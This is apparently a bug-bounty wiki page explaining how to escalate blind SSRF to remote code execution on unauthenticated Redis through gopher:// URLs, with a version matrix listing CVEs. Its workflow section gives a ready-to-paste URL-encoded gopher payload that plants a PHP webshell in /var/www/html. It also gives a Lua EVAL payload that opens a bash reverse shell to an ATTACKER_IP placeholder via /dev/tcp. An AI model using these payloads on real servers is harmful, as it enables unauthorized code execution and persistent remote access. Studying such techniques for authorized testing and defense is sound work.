---
title: Blind SSRF to Redis RCE via Gopher
created: 2026-09-24
updated: 2026-09-24
type: concept
tags:
  - ssrf
  - rce
  - bug-bounty
  - payload
sources:
  - BUG-Notes/performance monitor.md
confidence: high
contested: false
contradictions: []
parent: "[[web-and-bug-bounty]]"
cluster: web-and-bug-bounty
---
# Blind SSRF to Redis RCE via Gopher

## Overview
Server-Side Request Forgery (SSRF) vulnerabilities supporting the `gopher://` URL scheme allow attackers to send arbitrary raw TCP data packets to internal network services. When internal Redis instances (default port 6379) are exposed without authentication or protected mode, Gopher payloads can achieve unauthenticated Remote Code Execution (RCE).

## Version Matrix & Exploitation Techniques

| Target / Version | Primitive | Exploitation Mechanism | Notes |
| :--- | :--- | :--- | :--- |
| **Redis ≤ 6.x** | `CONFIG SET dir/dbfilename` | Overwrite root directory to webroot (`/var/www/html`) and write PHP webshell via `SAVE` | Blocked in Redis 7.0+ |
| **Redis 7.0+ to 8.2.x** | Lua Scripting (`EVAL`) | Command execution via `os.execute()` or Lua Use-After-Free (CVE-2025-49844) | Requires Lua enabled; patched in 8.3.2+ |
| **Redis 8.2.0–8.2.2** | Memory Corruption | XACKDEL buffer overflow (CVE-2025-62507) | Complex memory exploitation |

## Exploitation Workflow

### 1. Redis ≤ 6.x: Webroot Overwrite
Sequentially sends Redis RESP commands via Gopher:
1. `CONFIG SET dir /var/www/html`
2. `CONFIG SET dbfilename shell.php`
3. `SET x "<?php system($_GET['cmd']); ?>"`
4. `SAVE`

Payload snippet:
```text
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
```

### 2. Redis 7.0+: Lua EVAL Injection
When `CONFIG SET` is restricted, Lua scripting provides command execution:
```lua
gopher://redis:6379/_EVAL "os.execute('/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1')" 0
```

## Key Preconditions & Constraints
- Network reachability from the vulnerable server to Redis host/port.
- Redis server running without password or password cracked/known.
- Write permissions on destination directory (e.g. `redis` running as `www-data` user `33:33`).
- Stateless HTTP clients: Multiple requests must preserve state or write atomically.

## Related Pages
- [[web-and-bug-bounty]]
- [[performance monitor]]
- [[fastcgi-ssrf-exploitation]]
- [[wordpress-performance-monitor]]
- [[server-side-request-forgery]]
- [[redis-vs-fastcgi-ssrf-pivoting]]
